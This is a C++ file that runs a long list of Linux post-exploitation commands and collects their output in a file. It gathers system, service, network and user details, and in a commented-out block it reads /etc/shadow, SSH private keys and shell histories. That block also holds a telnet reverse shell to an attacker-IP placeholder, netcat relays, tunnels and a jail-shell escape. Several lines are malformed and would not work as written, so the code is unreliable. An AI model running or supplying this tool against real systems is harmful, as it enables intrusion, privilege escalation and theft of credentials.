/* 
 *
 *
 *
 * */

// Headers
#include <iostream>
#include <fstream>
#include <cstdlib>

int main() {
// Operating System
    // What's the distribution type? What version?
    system("cat /etc/issue >> out.txt");
    system("cat /etc/*-release >> out.txt");
    system("cat /etc/lsb-release >> out.txt");
    system("cat /etc/redhat-release >> out.txt");


    //What's the Kernel version? Is it 64-bit?
    system("cat /proc/version >> out.txt");
    system("uname -a >> out.txt");
    system("uname -mrs >> out.txt");
    system("rpm -q kernel >> out.txt");
    system("dmesg | grep Linux >> out.txt");
    system("ls /boot | grep vmlinuz- >> out.txt");


    // What can be learnt from the environmental variables?
    system("cat /etc/profile >> out.txt");
    system("cat /etc/bashrc >> out.txt");
    system("cat ~/.bash_profile >> out.txt");
    system("cat ~/.bashrc >> out.txt");
    system("cat ~/.bash_logout >> out.txt");
    system("env >> out.txt");
    system("set >> out.txt");


    // Is there a printer?
    //system("lpstat -a >> out.txt");


    // Applications & Services
    // What services are running? Which service has which user privilege?
    system("ps aux >> out.txt");
    system("ps -ef >> out.txt");
    system("top >> out.txt");
    system("cat /etc/service >> out.txt");


    // Which service(s) are been running by root? Of these services, which are vulnerable - it's worth a double check!
    system("ps aux | grep root >> out.txt");
    system("ps -ef | grep root >> out.txt");


    // What applications are installed? What version are they? Are they currently running?
    system("ls -alh /usr/bin/ >> out.txt");
    system("ls -alh /sbin/ >> out.txt");
    system("dpkg -l >> out.txt");
    system("rpm -qa >> out.txt");
    system("ls -alh /var/cache/apt/archives >> out.txt");
    system("ls -alh /var/cache/yum/ >> out.txt");


    // Any of the service(s) settings misconfigured? Are any (vulnerable) plugins attached?
    system("cat /etc/syslog.conf >> out.txt");
    system("cat /etc/chttp.conf >> out.txt");
    system("cat /etc/lighttpd.conf >> out.txt");
    system("cat /etc/cups/cupsd.conf >> out.txt");
    system("cat /etc/inetd.conf >> out.txt");
    system("cat /etc/apache2/apache2.conf >> out.txt");
    system("cat /etc/my.conf >> out.txt");
    system("cat /etc/httpd/conf/httpd.conf >> out.txt");
    system("cat /opt/lampp/etc/httpd.conf >> out.txt");
    system("ls -aRl /etc/ | awk '$1 ~ /^.*r.*/ >> out.txt");


    // What jobs are scheduled?
    system("crontab -l >> out.txt");
    system("ls -alh /var/spool/cron >> out.txt");
    system("ls -al /etc/ | grep cron >> out.txt");
    system("ls -al /etc/cron* >> out.txt");
    system("cat /etc/cron* >> out.txt");
    system("cat /etc/at.allow >> out.txt");
    system("cat /etc/at.deny >> out.txt");
    system("cat /etc/cron.allow >> out.txt");
    system("cat /etc/cron.deny >> out.txt");
    system("cat /etc/crontab >> out.txt");
    system("cat /etc/anacrontab >> out.txt");
    system("cat /var/spool/cron/crontabs/root >> out.txt");

    // Any plain text usernames and/or passwords?
    /*system("grep -i user [filename] >> out.txt");
    system("grep -i pass [filename] >> out.txt");
    system("grep -C 5 \"password\" [filename] >> out.txt");
    system("find . -name \"*.php\" -print0 | xargs -0 grep -i -n \"var $password\" >> out.txt");


//Communications & Networking
    // What NIC(s) does the system have? Is it connected to another network?
    system("/sbin/ifconfig -a >> out.txt");
    system("cat /etc/network/interfaces >> out.txt");
    system("cat /etc/sysconfig/network >> out.txt");


    // What are the network configuration settings? What can you find out about this network? DHCP server? DNS server? Gateway?
    system("cat /etc/resolv.conf >> out.txt");
    system("cat /etc/sysconfig/network >> out.txt");
    system("cat /etc/networks >> out.txt");
    system("iptables -L >> out.txt");
    system("hostname >> out.txt");
    system("dnsdomainname >> out.txt");


    // What other users & hosts are communicating with the system?
    system("lsof -i >> out.txt");
    system("lsof -i :80 >> out.txt");
    system("grep 80 /etc/services >> out.txt");
    system("netstat -antup >> out.txt");
    system("netstat -antpx >> out.txt");
    system("netstat -tulpn >> out.txt");
    system("chkconfig --list >> out.txt");
    system("chkconfig --list | grep 3:on >> out.txt");
    system("last >> out.txt");


    // Whats cached? IP and/or MAC addresses
    system("arp -e >> out.txt");
    system("route >> out.txt");
    system("/sbin/route -nee >> out.txt");


    // Is packet sniffing possible? What can be seen? Listen to live traffic
    system("tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.2.2.222 21 >> out.txt");


    // Have you got a shell? Can you interact with the system?
    system("nc -lvp 4444 >> out.txt");
    system("nc -lvp 4445 >> out.txt");
    system("telnet [atackers ip] 44444 | /bin/sh | [local ip] 44445 >> out.txt");


    // Is port forwarding possible? Redirect and interact with traffic from another view
    system("FPipe.exe -l 80 -r 80 -s 80 192.168.1.7 >> out.txt");

    system("ssh -L 8080:127.0.0.1:80 root@192.168.1.7 >> out.txt");
    system("ssh -R 8080:127.0.0.1:80 root@192.168.1.7 >> out.txt");

# mknod backpipe p ; nc -l -p [remote port] < backpipe  | nc [local IP] [local port] >backpipe
mknod backpipe p ; nc -l -p 8080 < backpipe | nc 10.1.1.251 80 >backpipe    # Port Relay
mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1>backpipe    # Proxy (Port 80 to 8080)
mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow & 1>backpipe    # Proxy monitor (Port 80 to 8080)


    // Is tunnelling possible? Send commands locally, remotely
    system("ssh -D 127.0.0.1:9050 -N [username]@[ip] >> out.txt");
    system("proxychains ifconfig >> out.txt");


// Confidential Information & Users
    // Who are you? Who is logged in? Who has been logged in? Who else is there? Who can do what?
    system("id >> out.txt");
    system("who >> out.txt");
    system("cat /etc/passwd | cut -d: >> out.txt");    // List of users
    system("grep -v -E \"^#\" /etc/passwd | awk -F: '$3 == 0 { print $1}' >> out.txt");   // List of super users
    system("awk -F: '($3 == \"0\") {print}' /etc/passwd >> out.txt");   // List of super users
    system("cat /etc/sudoers >> out.txt");
    system("sudo -l >> out.txt");


    // What sensitive files can be found?
    system("cat /etc/passwd >> out.txt");
    system("cat /etc/group >> out.txt");
    system("cat /etc/shadow >> out.txt");
    system("ls -alh /var/mail/ >> out.txt");


    // Anything "interesting" in the home directorie(s)? If it's possible to access
    system("ls -ahlR /root/ >> out.txt");
    system("ls -ahlR /home/ >> out.txt");


    // Are there any passwords in; scripts, databases, configuration files or log files? Default paths and locations for passwords
    system("cat /var/apache2/config.inc >> out.txt");
    system("cat /var/lib/mysql/mysql/user.MYD >> out.txt");
    system("cat /root/anaconda-ks.cfg >> out.txt");


    // What has the user being doing? Is there any password in plain text? What have they been edting?
    system("cat ~/.bash_history >> out.txt");
    system("cat ~/.nano_history >> out.txt");
    system("cat ~/.atftp_history >> out.txt");
    system("cat ~/.mysql_history >> out.txt");
    system("cat ~/.php_history >> out.txt");


    // What user information can be found?
    system("cat ~/.bashrc >> out.txt");
    system("cat ~/.profile >> out.txt");
    system("cat /var/mail/root >> out.txt");
    system("cat /var/spool/mail/root >> out.txt");


    // Can private-key information be found?
    system("cat ~/.ssh/authorized_keys >> out.txt");
    system("cat ~/.ssh/identity.pub >> out.txt");
    system("cat ~/.ssh/identity >> out.txt");
    system("cat ~/.ssh/id_rsa.pub >> out.txt");
    system("cat ~/.ssh/id_rsa >> out.txt");
    system("cat ~/.ssh/id_dsa.pub >> out.txt");
    system("cat ~/.ssh/id_dsa >> out.txt");
    system("cat /etc/ssh/ssh_config >> out.txt");
    system("cat /etc/ssh/sshd_config >> out.txt");
    system("cat /etc/ssh/ssh_host_dsa_key.pub >> out.txt");
    system("cat /etc/ssh/ssh_host_dsa_key >> out.txt");
    system("cat /etc/ssh/ssh_host_rsa_key.pub >> out.txt");
    system("cat /etc/ssh/ssh_host_rsa_key >> out.txt");
    system("cat /etc/ssh/ssh_host_key.pub >> out.txt");
    system("cat /etc/ssh/ssh_host_key >> out.txt");


// File Systems
    // Which configuration files can be written in /etc/? Able to reconfigure a service?
    system("ls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null >> out.txt");        // Owner
    system("ls -aRl /etc/ | awk '$1 ~ /^.....w/' 2>/dev/null >> out.txt");     // Group
    system("ls -aRl /etc/ | awk '$1 ~ /w.$/' 2>/dev/null >> out.txt");         // Other

    system("find /etc/ -readable -type f 2>/dev/null >> out.txt");             // Anyone
    system("find /etc/ -readable -type f -maxdepth 1 2>/dev/null >> out.txt"); // Anyone


    // What can be found in /var/ ?
    system("ls -alh /var/log >> out.txt");
    system("ls -alh /var/mail >> out.txt");
    system("ls -alh /var/spool >> out.txt");
    system("ls -alh /var/spool/lpd >> out.txt");
    system("ls -alh /var/lib/pgsql >> out.txt");
    system("ls -alh /var/lib/mysql >> out.txt");
    system("cat /var/lib/dhcp3/dhclient.leases >> out.txt");


    // Any settings/files (hidden) on website? Any settings file with database information?
    system("ls -alhR /var/www/ >> out.txt");
    system("ls -alhR /srv/www/htdocs/ >> out.txt");
    system("ls -alhR /usr/local/www/apache22/data/ >> out.txt");
    system("ls -alhR /opt/lampp/htdocs/ >> out.txt");
    system("ls -alhR /var/www/html/ >> out.txt");


    // Is there anything in the log file(s) (Could help with "Local File Includes"!)
    system("cat /etc/httpd/logs/access_log >> out.txt");
    system("cat /etc/httpd/logs/access.log >> out.txt");
    system("cat /etc/httpd/logs/error_log >> out.txt");
    system("cat /etc/httpd/logs/error.log >> out.txt");
    system("cat /var/log/apache2/access_log >> out.txt");
    system("cat /var/log/apache2/access.log >> out.txt");
    system("cat /var/log/apache2/error_log >> out.txt");
    system("cat /var/log/apache2/error.log >> out.txt");
    system("cat /var/log/apache/access_log >> out.txt");
    system("cat /var/log/apache/access.log >> out.txt");
    system("cat /var/log/auth.log >> out.txt");
    system("cat /var/log/chttp.log >> out.txt");
    system("cat /var/log/cups/error_log >> out.txt");
    system("cat /var/log/dpkg.log >> out.txt");
    system("cat /var/log/faillog >> out.txt");
    system("cat /var/log/httpd/access_log >> out.txt");
    system("cat /var/log/httpd/access.log >> out.txt");
    system("cat /var/log/httpd/error_log >> out.txt");
    system("cat /var/log/httpd/error.log >> out.txt");
    system("cat /var/log/lastlog >> out.txt");
    system("cat /var/log/lighttpd/access.log >> out.txt");
    system("cat /var/log/lighttpd/error.log >> out.txt");
    system("cat /var/log/lighttpd/lighttpd.access.log >> out.txt");
    system("cat /var/log/lighttpd/lighttpd.error.log >> out.txt");
    system("cat /var/log/messages >> out.txt");
    system("cat /var/log/secure >> out.txt");
    system("cat /var/log/syslog >> out.txt");
    system("cat /var/log/wtmp >> out.txt");
    system("cat /var/log/xferlog >> out.txt");
    system("cat /var/log/yum.log >> out.txt");
    system("cat /var/run/utmp >> out.txt");
    system("cat /var/webmin/miniserv.log >> out.txt");
    system("cat /var/www/logs/access_log >> out.txt");
    system("cat /var/www/logs/access.log >> out.txt");
    system("ls -alh /var/lib/dhcp3/ >> out.txt");
    system("ls -alh /var/log/postgresql/ >> out.txt");
    system("ls -alh /var/log/proftpd/ >> out.txt");
    system("ls -alh /var/log/samba/ >> out.txt");
    // auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp


    // If commands are limited, you break out of the jail shell?
    system("python -c 'import pty;pty.spawn(\"/bin/bash\")' >> out.txt");
    system("echo os.system('/bin/bash') >> out.txt");
    system("/bin/sh -i >> out.txt");


    // How are file-systems mounted?
    system("mount >> out.txt");
    system("df -h >> out.txt");


    // Are there any unmounted file-systems?
    system("cat /etc/fstab >> out.txt");


    // What Advanced Linux File Permissions are used? Sticky bits, SUID & GUID
    system("find / -perm -1000 -type d 2>/dev/null >> out.txt");    // Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here
    system("find / -perm -g=s -type f 2>/dev/null >> out.txt");     // SGID (chmod 2000) - run as the  group, not the user who started it.
    system("find / -perm -u=s -type f 2>/dev/null >> out.txt");     // SUID (chmod 4000) - run as the  owner, not the user who started it.

    system("find / -perm -g=s -o -perm -u=s -type f 2>/dev/null >> out.txt");    // SGID or SUID
    system("for i in `locate -r \"bin$\"`; do find $i \\( -perm -4000 -o -perm -2000 \\) -type f 2>/dev/null; done >> out.txt"); // Looks in 'common' places: /bin, /sbin, /usr/bin,
                                                                                                                      // usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin,
                                                                                                                      // for SGID or SUID (Quicker search)

    // find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
    system("find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \\; 2>/dev/null >> out.txt");


    // Where can written to and executed from? A few 'common' places: /tmp, /var/tmp, /dev/shm
    system("find / -writable -type d 2>/dev/null >> out.txt");        // world-writeable folders
    system("find / -perm -222 -type d 2>/dev/null >> out.txt");       // world-writeable folders
    system("find / -perm -o+w -type d 2>/dev/null >> out.txt");       // world-writeable folders

    system("find / -perm -o+x -type d 2>/dev/null >> out.txt");       // world-executable folders

    system("find / \( -perm -o+w -perm -o+x \\) -type d 2>/dev/null >> out.txt");   // world-writeable & executable folders


    // Any "problem" files? Word-writeable, "nobody" files
    system("find / -xdev -type d \\( -perm -0002 -a ! -perm -1000 \\) -print >> out.txt");   // world-writeable files
    system("find /dir -xdev \\( -nouser -o -nogroup \\) -print >> out.txt");   // Noowner files


// Preparation & Finding Exploit Code
    // What development tools/languages are installed/supported?
    system("find / -name perl* >> out.txt");
    system("find / -name python* >> out.txt");
    system("find / -name gcc* >> out.txt");
    system("find / -name cc >> out.txt");


    // How can files be uploaded?
    system("find / -name wget >> out.txt");
    system("find / -name nc* >> out.txt");
    system("find / -name netcat* >> out.txt");
    system("find / -name tftp* >> out.txt");
    system("find / -name ftp >> out.txt");*/

}

